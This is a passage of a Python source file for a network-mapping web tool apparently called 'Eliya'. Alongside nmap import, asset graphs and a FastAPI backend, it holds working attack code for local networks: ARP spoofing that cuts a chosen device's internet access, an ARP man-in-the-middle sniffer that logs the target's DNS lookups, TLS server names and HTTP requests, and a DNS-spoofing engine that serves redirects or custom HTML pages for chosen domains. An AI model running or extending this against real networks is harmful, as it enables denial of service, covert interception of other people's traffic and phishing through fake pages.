            if IP not in pkt: return
            src = pkt[IP].src; dst = pkt[IP].dst; ln = len(pkt)
            with self._lock:
                for ip, d in [(src,"out"),(dst,"in")]:
                    if ip not in self.stats: self.stats[ip] = TrafficStats()
                    s = self.stats[ip]
                    if d == "in":   s.bytes_in  += ln; s.pkts_in  += 1
                    else:           s.bytes_out += ln; s.pkts_out += 1
            # DNS snooping
            if UDP in pkt and pkt[UDP].dport == 53 and DNS in pkt:
                try:
                    dns = pkt[DNS]
                    if dns.qr == 0 and dns.qdcount > 0:
                        qn = dns.qd.qname.decode("utf-8","ignore").rstrip(".")
                        log_dns(src, qn, "A")
                except Exception: pass
            # TLS SNI
            if TCP in pkt and pkt[TCP].dport in (443,8443,8883) and Raw in pkt:
                sni = _sni(bytes(pkt[Raw]))
                if sni: log_dns(src, sni, "TLS-SNI", via_mitm=True)

        kwargs = {}
        if iface: kwargs["iface"] = iface
        try:
            sniff(prn=handler, store=False,
                  stop_filter=lambda _: not self._running, **kwargs)
        except Exception as e:
            console.print(f"[red]Sniff error: {e}[/red]")
            self._running = False


traffic_monitor = TrafficMonitor()


# ── Shared gateway detection ─────────────────────────────────────────────────

def _detect_gateway() -> tuple:
    """Return (gw_ip, gw_mac, my_mac, iface) or empty strings on failure."""
    gw_ip = gw_mac = my_mac = iface = ""
    try:
        is_win = platform.system() == "Windows"
        if is_win:
            r = subprocess.run(["route", "print", "0.0.0.0"],
                               capture_output=True, text=True)
            for line in r.stdout.splitlines():
                m = re.search(r"0\.0\.0\.0\s+0\.0\.0\.0\s+(\d+\.\d+\.\d+\.\d+)", line)
                if m: gw_ip = m.group(1); break
        else:
            r = subprocess.run(["ip", "route", "show", "default"],
                               capture_output=True, text=True)
            m = re.search(r"default via (\S+)", r.stdout)
            if m: gw_ip = m.group(1)
        if gw_ip:
            r2 = subprocess.run(["arp", "-a", gw_ip], capture_output=True, text=True)
            m  = re.search(r"([0-9a-fA-F]{2}[:\-]){5}[0-9a-fA-F]{2}", r2.stdout)
            if m: gw_mac = m.group(0).replace("-", ":").upper()
        from scapy.all import get_if_hwaddr, conf
        my_mac = get_if_hwaddr(conf.iface).upper()
        iface  = conf.iface
    except Exception as e:
        console.print(f"[yellow]Gateway detect: {e}[/yellow]")
    return gw_ip, gw_mac, my_mac, iface


# ── ARP Controller (cut / restore internet access) ────────────────────────────

class ARPController:
    def __init__(self):
        self._cut:      set  = set()
        self._stop_evts: dict = {}
        self._gw_ip  = ""
        self._gw_mac = ""
        self._my_mac = ""
        self._lock   = threading.Lock()

    def _detect(self):
        self._gw_ip, self._gw_mac, self._my_mac, _ = _detect_gateway()

    def cut(self, target_ip: str, target_mac: str = ""):
        if not self._gw_ip: self._detect()
        if not self._gw_ip: raise ValueError("Gateway not detected — run an ARP scan first.")
        with self._lock:
            if target_ip in self._cut: return
            self._cut.add(target_ip)
        evt = threading.Event(); self._stop_evts[target_ip] = evt

        def _loop():
            try:
                from scapy.all import ARP, Ether, sendp
                while not evt.wait(2):
                    t_mac = target_mac or "ff:ff:ff:ff:ff:ff"
                    sendp(Ether(dst=t_mac)/ARP(op=2,pdst=target_ip,hwdst=t_mac,
                               psrc=self._gw_ip,hwsrc=self._my_mac), verbose=0)
                    if self._gw_mac:
                        sendp(Ether(dst=self._gw_mac)/ARP(op=2,pdst=self._gw_ip,
                               hwdst=self._gw_mac,psrc=target_ip,hwsrc=self._my_mac), verbose=0)
            except Exception as e:
                console.print(f"[red]ARP cut: {e}[/red]")
            with self._lock: self._cut.discard(target_ip)

        threading.Thread(target=_loop, daemon=True).start()
        conn = get_db(); conn.execute("UPDATE assets SET is_cut=1 WHERE ip=?",(target_ip,))
        conn.commit(); conn.close()
        log_event(target_ip, "cut", "internet access blocked")

    def restore(self, target_ip: str, target_mac: str = ""):
        evt = self._stop_evts.pop(target_ip, None)
        with self._lock: self._cut.discard(target_ip)
        if evt: evt.set(); time.sleep(0.1)
        try:
            from scapy.all import ARP, Ether, sendp
            t_mac = target_mac or "ff:ff:ff:ff:ff:ff"
            if self._gw_ip and self._gw_mac:
                sendp(Ether(dst=t_mac)/ARP(op=2,pdst=target_ip,hwdst=t_mac,
                           psrc=self._gw_ip,hwsrc=self._gw_mac), verbose=0, count=5)
        except Exception: pass
        conn = get_db(); conn.execute("UPDATE assets SET is_cut=0 WHERE ip=?",(target_ip,))
        conn.commit(); conn.close()
        log_event(target_ip, "restored", "internet access restored")

    @property
    def cut_ips(self): return set(self._cut)


arp_ctrl = ARPController()


# ── Passive MITM Sniffer ──────────────────────────────────────────────────────

class MITMSniff:
    """Transparent ARP MITM — forwards packets so device keeps internet while
    we intercept and analyse everything: DNS, TLS SNI, HTTP, TCP connections."""

    _PORT_PROTO = {
        21:"FTP", 22:"SSH", 23:"Telnet", 25:"SMTP", 53:"DNS",
        80:"HTTP", 110:"POP3", 143:"IMAP", 443:"HTTPS", 445:"SMB",
        3306:"MySQL", 3389:"RDP", 5432:"PostgreSQL", 5900:"VNC",
        6379:"Redis", 8080:"HTTP-Alt", 8443:"HTTPS-Alt", 27017:"MongoDB",
    }

    def __init__(self):
        self._active: dict = {}   # ip → {"evt": Event, "mac": str}
        self._lock   = threading.Lock()
        self._gw_ip  = ""
        self._gw_mac = ""
        self._my_mac = ""
        self._iface  = None

    def _detect(self):
        self._gw_ip, self._gw_mac, self._my_mac, self._iface = _detect_gateway()

    def start(self, target_ip: str, target_mac: str = "", on_event=None):
        if not self._gw_ip: self._detect()
        if not self._gw_ip: raise ValueError("Gateway not detected — run ARP scan first.")
        if platform.system() == "Linux":
            try:
                with open("/proc/sys/net/ipv4/ip_forward") as _f:
                    if _f.read().strip() == "0":
                        console.print("[yellow]Warning: IP forwarding disabled — "
                                      "target may lose internet. Fix: "
                                      "sysctl -w net.ipv4.ip_forward=1[/yellow]")
            except Exception:
                pass
        with self._lock:
            if target_ip in self._active: return
            evt = threading.Event()
            self._active[target_ip] = {"evt": evt, "mac": target_mac}
        gw_ip  = self._gw_ip; gw_mac = self._gw_mac
        my_mac = self._my_mac; iface  = self._iface

        def _arp_loop():
            try:
                from scapy.all import ARP, Ether, sendp
                t_mac = target_mac or "ff:ff:ff:ff:ff:ff"
                while not evt.wait(2):
                    sendp(Ether(dst=t_mac)/ARP(op=2,pdst=target_ip,hwdst=t_mac,
                               psrc=gw_ip,hwsrc=my_mac), verbose=0)
                    if gw_mac:
                        sendp(Ether(dst=gw_mac)/ARP(op=2,pdst=gw_ip,hwdst=gw_mac,
                               psrc=target_ip,hwsrc=my_mac), verbose=0)
            except Exception as e:
                console.print(f"[red]MITM ARP loop: {e}[/red]")

        def _sniff_loop():
            try:
                from scapy.all import sniff, IP, UDP, TCP, DNS, DNSRR, Raw, Ether, sendp
            except ImportError:
                console.print("[yellow]scapy not installed — MITM inactive[/yellow]")
                with self._lock: self._active.pop(target_ip, None)
                return

            def _sni(raw: bytes) -> str:
                try:
                    if len(raw) < 6 or raw[0] != 22 or raw[5] != 1: return ""
                    pos = 43
                    if pos >= len(raw): return ""
                    pos += raw[pos] + 1
                    if pos + 2 >= len(raw): return ""
                    pos += 2 + ((raw[pos] << 8) | raw[pos+1])
                    if pos >= len(raw): return ""
                    pos += raw[pos] + 1
                    if pos + 2 >= len(raw): return ""
                    pos += 2
                    while pos + 4 < len(raw):
                        et = (raw[pos] << 8) | raw[pos+1]
                        el = (raw[pos+2] << 8) | raw[pos+3]
                        pos += 4
                        if et == 0 and pos + 5 < len(raw):
                            nlen = (raw[pos+3] << 8) | raw[pos+4]
                            return raw[pos+5:pos+5+nlen].decode("utf-8","ignore")
                        pos += el
                except Exception: pass
                return ""

            _HTTP_METHODS = (b"GET ", b"POST ", b"PUT ", b"DELETE ",
                             b"HEAD ", b"OPTIONS ", b"PATCH ", b"CONNECT ")

            def _http_requests(buf: bytes) -> tuple:
                """Extract all complete HTTP requests from buffer.
                Returns (list_of_request_dicts, remaining_bytes)."""
                reqs = []
                while True:
                    # Find earliest HTTP method start
                    start = -1
                    for m in _HTTP_METHODS:
                        i = buf.find(m)
                        if i >= 0 and (start < 0 or i < start): start = i
                    if start < 0:
                        # No method found — keep last 16 bytes in case split at boundary
                        return reqs, buf[-16:] if len(buf) > 16 else buf
                    buf = buf[start:]
                    hdr_end = buf.find(b"\r\n\r\n")
                    if hdr_end < 0:
                        if len(buf) > 32768: buf = buf[-256:]  # sanity cap
                        return reqs, buf
                    hdr_bytes = buf[:hdr_end]
                    try:
                        lines = hdr_bytes.decode("utf-8", "ignore").split("\r\n")
                    except Exception:
                        buf = buf[hdr_end + 4:]; continue
                    req_parts = lines[0].split(" ")
                    if len(req_parts) < 2:
                        buf = buf[hdr_end + 4:]; continue
                    method = req_parts[0]
                    path   = req_parts[1]
                    host = ua = referer = ""
                    clen = 0
                    for ln in lines[1:]:
                        ll = ln.lower()
                        if   ll.startswith("host:"):           host    = ln[5:].strip()
                        elif ll.startswith("user-agent:"):     ua      = ln[11:].strip()
                        elif ll.startswith("referer:"):        referer = ln[8:].strip()
                        elif ll.startswith("content-length:"):
                            try: clen = int(ln[15:].strip())
                            except: pass
                    if host:
                        reqs.append({"method":method,"path":path,"host":host,
                                     "ua":ua,"referer":referer})
                    buf = buf[hdr_end + 4 + max(0, clen):]
                return reqs, buf

            seen    = set()   # deduplicate connections
            tcp_buf = {}      # (src,dst,sport,dport) -> bytes  — HTTP stream reassembly

            def handler(pkt):
                if Ether not in pkt or IP not in pkt: return
                if pkt[Ether].src.upper() == my_mac: return  # skip our own forwarded pkts

                src = pkt[IP].src; dst = pkt[IP].dst
                if src != target_ip and dst != target_ip: return

                # ── DNS spoof pre-check: suppress forward if spoofing this query ──
                _suppress_forward = False
                if (src == target_ip and UDP in pkt and pkt[UDP].dport == 53
                        and DNS in pkt and pkt[DNS].qr == 0 and pkt[DNS].qdcount > 0):
                    try:
                        _qn_check = pkt[DNS].qd.qname.decode("utf-8","ignore").rstrip(".")
                        if dns_spoof.match(_qn_check): _suppress_forward = True
                    except Exception: pass

                # ── forward the packet so device keeps internet ──
                if not _suppress_forward:
                    fwd = pkt.copy()
                    fwd[Ether].src = my_mac
                    fwd[Ether].dst = gw_mac if src == target_ip else (target_mac or "ff:ff:ff:ff:ff:ff")
                    del fwd[IP].chksum
                    if TCP in fwd and hasattr(fwd[TCP],'chksum'): del fwd[TCP].chksum
                    if UDP in fwd and hasattr(fwd[UDP],'chksum'): del fwd[UDP].chksum
                    try: sendp(fwd, verbose=0, iface=iface)
                    except Exception: pass

                # ── analyse outbound packets from the target ──
                if src != target_ip: return
                now = datetime.now().isoformat()

                if UDP in pkt and pkt[UDP].dport == 53 and DNS in pkt:
                    try:
                        dns_pkt = pkt[DNS]
                        if dns_pkt.qr == 0 and dns_pkt.qdcount > 0:
                            qn = dns_pkt.qd.qname.decode("utf-8","ignore").rstrip(".")
                            if qn and len(qn) > 3 and not qn.endswith(".arpa"):
                                # ── DNS spoof check ──────────────────────────────
                                spoof_rule = dns_spoof.match(qn)
                                if spoof_rule:
                                    our_ip = dns_spoof.our_ip
                                    try:
                                        from scapy.all import Ether as _E, sendp as _sp, get_if_hwaddr as _ghw
                                        fake = (IP(dst=src, src=dst) /
                                                UDP(dport=pkt[UDP].sport, sport=53) /
                                                DNS(id=dns_pkt.id, qr=1, aa=1, rd=1, ra=1,
                                                    qd=dns_pkt.qd,
                                                    an=DNSRR(rrname=dns_pkt.qd.qname,
                                                             ttl=10, rdata=our_ip)))
                                        # Wrap in Ethernet to send as Layer-2 packet back to target
                                        eth_fake = _E(dst=pkt[Ether].src, src=pkt[Ether].dst) / fake
                                        sendp(eth_fake, verbose=0, iface=iface)
                                    except Exception as ex:
                                        console.print(f"[red]DNS spoof send: {ex}[/red]")
                                    log_event(src, "dns_spoofed", f"{qn} → {our_ip}")
                                    if on_event: on_event({"type":"dns_spoofed","ip":src,
                                        "domain":qn,"to":our_ip,"rule":spoof_rule,"ts":now})
                                    # Don't forward — let the fake response win
                                else:
                                    # Normal: log and forward
                                    log_dns(src, qn, "A", via_mitm=True)
                                    key = (src, dst, 53, qn)
                                    if key not in seen:
                                        seen.add(key); seen.discard(next(iter(seen))) if len(seen)>600 else None
                                        log_connection(src, dst, 53, "UDP", "DNS", qn, ts=now)
                                        if on_event: on_event({"type":"mitm_live","ip":src,
                                            "proto":"DNS","domain":qn,"dst":dst,"dport":53,"ts":now})
                    except Exception: pass

                elif TCP in pkt and pkt[TCP].dport in (443,8443,8883) and Raw in pkt:
                    sni = _sni(bytes(pkt[Raw])); dport = pkt[TCP].dport
                    if sni:
                        log_dns(src, sni, "TLS-SNI", via_mitm=True)
                        key = (src, dst, dport)
                        if key not in seen:
                            seen.add(key)
                            log_connection(src, dst, dport, "TCP", "HTTPS", sni, ts=now)
                            if on_event: on_event({"type":"mitm_live","ip":src,
                                "proto":"HTTPS","domain":sni,"dst":dst,"dport":dport,"ts":now})

                elif TCP in pkt and pkt[TCP].dport in (80, 8080):
                    # ── TCP stream reassembly for HTTP (catches keep-alive requests) ──
                    if Raw in pkt:
                        fk = (src, dst, pkt[TCP].sport, pkt[TCP].dport)
                        tcp_buf[fk] = tcp_buf.get(fk, b"") + bytes(pkt[Raw])
                        if len(tcp_buf[fk]) > 65536: tcp_buf[fk] = tcp_buf[fk][-2048:]
                        reqs, tcp_buf[fk] = _http_requests(tcp_buf[fk])
                        for h in reqs:
                            if h["host"]: log_dns(src, h["host"], "HTTP-Host", via_mitm=True)
                            key = (src, dst, pkt[TCP].dport, h["host"], h["method"], h["path"])
                            if key not in seen:
                                seen.add(key)
                                if len(seen) > 2000: seen.discard(next(iter(seen)))
                                full_url = f"http://{h['host']}{h['path']}"
                                log_connection(src, dst, pkt[TCP].dport, "TCP", "HTTP",
                                              h["host"], h["method"], h["path"],
                                              h["ua"], h["referer"], ts=now)
                                if on_event: on_event({"type":"mitm_live","ip":src,
                                    "proto":"HTTP","domain":h["host"],"path":h["path"],
                                    "method":h["method"],"referer":h["referer"],
                                    "url":full_url,"dst":dst,"dport":pkt[TCP].dport,"ts":now})
                    # Clean up flow buffer on FIN/RST
                    if pkt[TCP].flags & 0x005:  # FIN=0x01 or RST=0x04
                        fk = (src, dst, pkt[TCP].sport, pkt[TCP].dport)
                        tcp_buf.pop(fk, None)

                elif TCP in pkt and (pkt[TCP].flags & 0x002) and not (pkt[TCP].flags & 0x010):
                    # ── TCP SYN — new connection to non-HTTP/HTTPS port ──
                    dport = pkt[TCP].dport; app = self._PORT_PROTO.get(dport, f"TCP:{dport}")
                    key = (src, dst, dport)
                    if key not in seen and app not in ("HTTP","HTTPS","HTTP-Alt","HTTPS-Alt","DNS"):
                        seen.add(key)
                        log_connection(src, dst, dport, "TCP", app, ts=now)
                        if on_event: on_event({"type":"mitm_live","ip":src,
                            "proto":app,"domain":None,"dst":dst,"dport":dport,"ts":now})

            try:
                sniff(filter=f"host {target_ip}", prn=handler, store=False,
                      stop_filter=lambda _: evt.is_set(), iface=iface)
            except Exception as e:
                console.print(f"[red]MITM sniff: {e}[/red]")

        threading.Thread(target=_arp_loop,   daemon=True).start()
        threading.Thread(target=_sniff_loop, daemon=True).start()
        log_event(target_ip, "mitm_started", "passive MITM sniff active")
        console.print(f"[green]MITM sniff:[/green] {target_ip} — forwarding + capturing all traffic")

    def stop(self, target_ip: str, target_mac: str = ""):
        with self._lock:
            info = self._active.pop(target_ip, None)
        if not info: return
        info["evt"].set(); time.sleep(0.3)
        try:
            from scapy.all import ARP, Ether, sendp
            t_mac = target_mac or info.get("mac") or "ff:ff:ff:ff:ff:ff"
            if self._gw_ip and self._gw_mac:
                sendp(Ether(dst=t_mac)/ARP(op=2,pdst=target_ip,hwdst=t_mac,
                           psrc=self._gw_ip,hwsrc=self._gw_mac), verbose=0, count=5)
        except Exception: pass
        log_event(target_ip, "mitm_stopped", "passive MITM sniff stopped")
        console.print(f"[yellow]MITM stopped:[/yellow] {target_ip}")

    def stop_all(self):
        with self._lock: ips = list(self._active.keys())
        for ip in ips: self.stop(ip)

    @property
    def active_ips(self):
        with self._lock: return set(self._active.keys())


mitm_sniff = MITMSniff()


# ── DNS Spoof + HTTP Redirect Engine ─────────────────────────────────────────

class DNSSpoofEngine:
    """
    DNS spoofing + HTTP redirect/custom-page server.
    Rules map a domain pattern to a redirect URL or custom HTML.
    Works for HTTP (full redirect). HTTPS shows cert warning unless CA cert trusted.
    """

    def __init__(self):
        self._rules:  dict = {}   # domain_lower -> {"domain","redirect","html","wildcard"}
        self._lock    = threading.Lock()
        self._srv_thr: threading.Thread | None = None
        self.http_port = 80
        self._our_ip   = ""

    @property
    def our_ip(self) -> str:
        if not self._our_ip:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80)); self._our_ip = s.getsockname()[0]; s.close()
            except Exception: self._our_ip = "127.0.0.1"
        return self._our_ip

    def add_rule(self, domain: str, redirect: str = None, html: str = None):
        key = domain.lower().lstrip("*.").strip(".")
        wildcard = domain.startswith("*.")
        with self._lock:
            self._rules[key] = {"domain": domain, "redirect": redirect,
                                "html": html, "wildcard": wildcard}
        self._ensure_server()

    def remove_rule(self, domain: str):
        key = domain.lower().lstrip("*.").strip(".")
        with self._lock: self._rules.pop(key, None)

    def get_rules(self) -> list:
        with self._lock: return list(self._rules.values())

    def match(self, qname: str) -> dict | None:
        q = qname.lower().strip(".")
        with self._lock:
            # Exact match
            if q in self._rules: return self._rules[q]
            # Wildcard: *.example.com matches sub.example.com
            parts = q.split(".")
            for i in range(1, len(parts)):
                parent = ".".join(parts[i:])
                r = self._rules.get(parent)
                if r and r["wildcard"]: return r
        return None

    def _ensure_server(self):
        if self._srv_thr and self._srv_thr.is_alive(): return
        self._srv_thr = threading.Thread(target=self._serve, daemon=True)
        self._srv_thr.start()

    def _serve(self):
        for port in (80, 8080, 18080):
            try:
                srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                srv.bind(("0.0.0.0", port)); srv.listen(64)
                srv.settimeout(1.0); self.http_port = port
                console.print(f"[green]Spoof HTTP server:[/green] listening on :{port}")
                while True:
                    try:
                        client, addr = srv.accept()
                        threading.Thread(target=self._handle,
                                         args=(client,), daemon=True).start()
                    except socket.timeout: continue
                    except Exception: break
                srv.close(); return
            except OSError: continue

    def _handle(self, client: socket.socket):
        try:
            client.settimeout(5.0)
            data = b""
            while b"\r\n\r\n" not in data:
                chunk = client.recv(4096)
                if not chunk: break
                data += chunk
                if len(data) > 8192: break
            lines = data.decode("utf-8", "ignore").split("\r\n")
            host = ""
            for ln in lines[1:]:
                if ln.lower().startswith("host:"):
                    host = ln[5:].strip().split(":")[0].lower(); break
            rule = self.match(host)
            if rule:
                if rule.get("redirect"):
                    resp = (f"HTTP/1.1 302 Found\r\n"
                            f"Location: {rule['redirect']}\r\n"
                            f"Content-Length: 0\r\nConnection: close\r\n\r\n")
                    client.sendall(resp.encode())
                elif rule.get("html"):
                    body = rule["html"].encode("utf-8")
                    resp = (f"HTTP/1.1 200 OK\r\n"
                            f"Content-Type: text/html; charset=utf-8\r\n"
                            f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n")
                    client.sendall(resp.encode() + body)
                else:
                    client.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n"
                                   b"Connection: close\r\n\r\n")
            else:
                client.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n"
                               b"Connection: close\r\n\r\n")
        except Exception: pass
        finally:
            try: client.close()
            except: pass


dns_spoof = DNSSpoofEngine()


# ── Live Monitor ──────────────────────────────────────────────────────────────

class NetworkMonitor:
    def __init__(self):
        self._stop_evt = threading.Event()
        self.running   = False
        self.network   = ""
        self.interval  = 30

    def start(self, network: str, interval: int = 30, on_event=None):
        if self.running: self.stop()
        self.network = network; self.interval = interval
        self._stop_evt.clear(); self.running = True
        threading.Thread(target=self._loop, args=(on_event,), daemon=True).start()
        console.print(f"[green]Monitor started:[/green] {network} every {interval}s")

    def stop(self):
        self._stop_evt.set(); self.running = False

    def _loop(self, on_event):
        conn   = get_db()
        known  = {r["ip"] for r in conn.execute("SELECT ip FROM assets WHERE status='up'").fetchall()}
        conn.close()
        while not self._stop_evt.wait(0):
            try:
                current    = arp_scan(self.network, on_event)
                curr_ips   = {h["ip"] for h in current}
                for h in current:
                    if h["ip"] not in known:
                        log_event(h["ip"], "joined", f"MAC {h['mac']} · {h['vendor']}")
                        if on_event:
                            on_event({"type":"device_joined","ip":h["ip"],"mac":h["mac"],
                                      "vendor":h["vendor"],"hostname":h["hostname"]})
                gone = known - curr_ips
                if gone:
                    conn = get_db()
                    for ip in gone:
                        conn.execute("UPDATE assets SET status='down' WHERE ip=?",(ip,))
                        log_event(ip,"left","")
                        if on_event: on_event({"type":"device_left","ip":ip})
                    conn.commit(); conn.close()
                known = curr_ips
            except Exception as e:
                console.print(f"[red]Monitor error: {e}[/red]")
            self._stop_evt.wait(self.interval)
        self.running = False


monitor = NetworkMonitor()


# ── nmap integration ──────────────────────────────────────────────────────────

def parse_nmap_xml(xml_path: str) -> list:
    assets = []
    try:
        root = ET.parse(xml_path).getroot()
        for host in root.findall("host"):
            st = host.find("status")
            if st is None or st.get("state") != "up": continue
            ip = mac = vendor = hostname = os_name = os_vendor = None
            for addr in host.findall("address"):
                t = addr.get("addrtype")
                if t == "ipv4":  ip = addr.get("addr")
                elif t == "mac": mac = addr.get("addr"); vendor = addr.get("vendor","")
            if not ip: continue
            hn = host.find('.//hostnames/hostname[@type="PTR"]') or host.find(".//hostnames/hostname")
            if hn is not None: hostname = hn.get("name")
            osmatch = host.find(".//os/osmatch")
            if osmatch is not None:
                os_name = osmatch.get("name")
                osc = osmatch.find("osclass")
                if osc is not None: os_vendor = osc.get("vendor")
            ports = []
            for pe in host.findall(".//ports/port"):
                st2 = pe.find("state")
                if st2 is None or st2.get("state") != "open": continue
                svc = pe.find("service") or ET.Element("service")
                ports.append({"port":int(pe.get("portid")),"protocol":pe.get("protocol","tcp"),
                               "state":"open","service":svc.get("name",""),
                               "product":svc.get("product",""),"version":svc.get("version","")})
            if not vendor and mac: vendor = get_vendor(mac)
            dt = classify_device(ports, os_name or "", vendor or "", mac or "")
            assets.append({"ip":ip,"mac":mac,"hostname":hostname,"os":os_name,
                           "os_vendor":os_vendor,"vendor":vendor,"device_type":dt,
                           "risk_score":calculate_risk(ports),"status":"up","ports":ports})
    except Exception as e:
        console.print(f"[red]XML parse: {e}[/red]")
    return assets


def import_nmap_xml(xml_path: str, on_event=None) -> int:
    assets = parse_nmap_xml(xml_path)
    for asset in assets:
        ports = asset.pop("ports",[])
        upsert_asset(**asset)
        for p in ports:
            pnum = p.pop("port"); add_port(asset["ip"], pnum, **p)
        if on_event: on_event({"type":"asset_added","ip":asset["ip"]})
    return len(assets)


def run_nmap_scan(target: str, scan_id: int, on_event=None):
    conn = get_db(); c = conn.cursor()
    tmp  = tempfile.mktemp(suffix=".xml", prefix="eliya_")
    try:
        if on_event: on_event({"type":"scan_progress","scan_id":scan_id,"message":f"Scanning {target}…"})
        proc = subprocess.run(
            ["nmap","-sV","-O","--osscan-guess","-T4","--open","-oX",tmp,target],
            capture_output=True, text=True, timeout=600)
        if proc.returncode != 0:
            c.execute("UPDATE scans SET status='error',error=?,finished_at=? WHERE id=?",
                      (proc.stderr[:500], datetime.now().isoformat(), scan_id))
        else:
            count = import_nmap_xml(tmp, on_event)
            c.execute("UPDATE scans SET status='done',assets_found=?,finished_at=? WHERE id=?",
                      (count, datetime.now().isoformat(), scan_id))
            if on_event: on_event({"type":"scan_done","scan_id":scan_id,"count":count})
    except FileNotFoundError:
        c.execute("UPDATE scans SET status='error',error='nmap not found',finished_at=? WHERE id=?",
                  (datetime.now().isoformat(), scan_id))
        if on_event: on_event({"type":"scan_error","scan_id":scan_id,"message":"nmap not found"})
    except Exception as e:
        c.execute("UPDATE scans SET status='error',error=?,finished_at=? WHERE id=?",
                  (str(e), datetime.now().isoformat(), scan_id))
    finally:
        conn.commit(); conn.close(); Path(tmp).unlink(missing_ok=True)


def run_arp_scan_bg(network: str, scan_id: int, on_event=None):
    conn = get_db(); c = conn.cursor()
    try:
        hosts = arp_scan(network, on_event)
        c.execute("UPDATE scans SET status='done',assets_found=?,finished_at=? WHERE id=?",
                  (len(hosts), datetime.now().isoformat(), scan_id))
        if on_event: on_event({"type":"scan_done","scan_id":scan_id,"count":len(hosts)})
    except Exception as e:
        console.print(f"[red bold]Scan error: {e}[/red bold]")
        c.execute("UPDATE scans SET status='error',error=?,finished_at=? WHERE id=?",
                  (str(e), datetime.now().isoformat(), scan_id))
    finally:
        conn.commit(); conn.close()


# ── Graph Builder ─────────────────────────────────────────────────────────────

def build_graph() -> dict:
    conn      = get_db()
    assets    = [dict(r) for r in conn.execute("SELECT * FROM assets").fetchall()]
    ports_all = conn.execute("SELECT * FROM ports").fetchall()
    conn.close()
    ports_map: dict = {}
    for p in ports_all:
        p = dict(p); ports_map.setdefault(p["asset_ip"],[]).append(p)
    subnet_map: dict = {}
    for a in assets:
        sn = a["ip"].rsplit(".",1)[0]; subnet_map.setdefault(sn,[]).append(a["ip"])
    nodes, edges, seen_subnets = [], [], set()
    for asset in assets:
        ip    = asset["ip"]; ports = ports_map.get(ip,[])
        sn    = ip.rsplit(".",1)[0]; sn_id = f"sn_{sn.replace('.','_')}"
        if sn_id not in seen_subnets and len(subnet_map.get(sn,[]))>1:
            seen_subnets.add(sn_id)
            nodes.append({"data":{"id":sn_id,"label":f"{sn}.0/24","device_type":"subnet",
                                   "color":DEVICE_COLORS["subnet"],"shape":"round-rectangle",
                                   "risk_score":0,"virtual":True}})
        offline = asset.get("status") == "down"
        dt      = asset.get("device_type","unknown")
        color   = DEVICE_COLORS.get("offline" if offline else dt, DEVICE_COLORS["unknown"])
        d = {**asset,
             "id":          ip,
             "label":       asset.get("hostname") or ip,
             "color":       color,
             "shape":       DEVICE_SHAPES.get(dt,"ellipse"),
             "port_count":  len(ports),
             "offline":     offline,
             "is_cut":      asset.get("is_cut",0),
             "ports_summary": [f"{p['port']}/{p['protocol']} {p['service']}".strip()
                                for p in sorted(ports, key=lambda x:x["port"])[:15]]}
        nodes.append({"data":d})
        if sn_id in seen_subnets:
            edges.append({"data":{"id":f"{sn_id}--{ip}","source":sn_id,"target":ip}})
    return {"nodes":nodes,"edges":edges}


# ── Local network detection ───────────────────────────────────────────────────

def get_local_ip() -> str:
    """Return the machine's actual LAN/WiFi IP (not loopback)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        pass
    # Fallback: pick first non-loopback from hostname resolution
    try:
        for ip in socket.gethostbyname_ex(socket.gethostname())[2]:
            if not ip.startswith("127."):
                return ip
    except Exception:
        pass
    return "192.168.1.1"


def local_network_cidr() -> str:
    ip = get_local_ip()
    parts = ip.rsplit(".", 1)
    return f"{parts[0]}.0/24"


# ── WebSocket Manager ─────────────────────────────────────────────────────────

class WSManager:
    def __init__(self):
        self._sockets: list = []
        self._queue:   list = []
        self._lock = threading.Lock()

    async def connect(self, ws: WebSocket):
        await ws.accept()
        with self._lock: self._sockets.append(ws)

    def disconnect(self, ws: WebSocket):
        with self._lock:
            if ws in self._sockets: self._sockets.remove(ws)

    def enqueue(self, data: dict):
        with self._lock: self._queue.append(data)

    async def flush(self):
        with self._lock: items, self._queue = self._queue[:], []
        for item in items:
            msg = json.dumps(item); dead = []
            for ws in list(self._sockets):
                try: await ws.send_text(msg)
                except Exception: dead.append(ws)
            for ws in dead: self.disconnect(ws)


ws_mgr = WSManager()


# ── FastAPI ───────────────────────────────────────────────────────────────────

@asynccontextmanager
async def lifespan(app: FastAPI):
    import asyncio

    async def _flush():
        while True:
            await ws_mgr.flush(); await asyncio.sleep(0.1)

    async def _push_traffic():
        while True:
            await asyncio.sleep(2)
            speeds = traffic_monitor.get_all_speeds()
            if speeds: ws_mgr.enqueue({"type":"traffic_update","speeds":speeds})

    t1 = asyncio.create_task(_flush())
    t2 = asyncio.create_task(_push_traffic())
    yield
    t1.cancel(); t2.cancel()
    monitor.stop(); traffic_monitor.stop()
    mitm_sniff.stop_all()
    for ip in list(arp_ctrl.cut_ips): arp_ctrl.restore(ip)


app = FastAPI(title="Eliya", lifespan=lifespan)
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])


@app.get("/", response_class=HTMLResponse)
async def index():
    return HTMLResponse((WEB_DIR / "index.html").read_text(encoding="utf-8"))


@app.get("/api/local-network")
async def api_local_network():
    ip  = get_local_ip()
    net = local_network_cidr()
    return {"ip": ip, "network": net}


@app.get("/api/graph")
async def api_graph(): return build_graph()


@app.get("/api/assets")
async def api_assets():
    conn = get_db()
    rows = [dict(r) for r in conn.execute("SELECT * FROM assets ORDER BY ip").fetchall()]
    conn.close(); return rows


@app.get("/api/assets/{ip:path}")
async def api_asset(ip: str):
    conn = get_db()
    row  = conn.execute("SELECT * FROM assets WHERE ip=?", (ip,)).fetchone()
    if not row: raise HTTPException(404,"Not found")
    a = dict(row)
    a["ports"]           = [dict(r) for r in conn.execute("SELECT * FROM ports WHERE asset_ip=? ORDER BY port",(ip,)).fetchall()]
    a["vulnerabilities"] = [dict(r) for r in conn.execute("SELECT * FROM vulnerabilities WHERE asset_ip=?",(ip,)).fetchall()]
    a["certificates"]    = [dict(r) for r in conn.execute("SELECT * FROM certificates WHERE asset_ip=?",(ip,)).fetchall()]
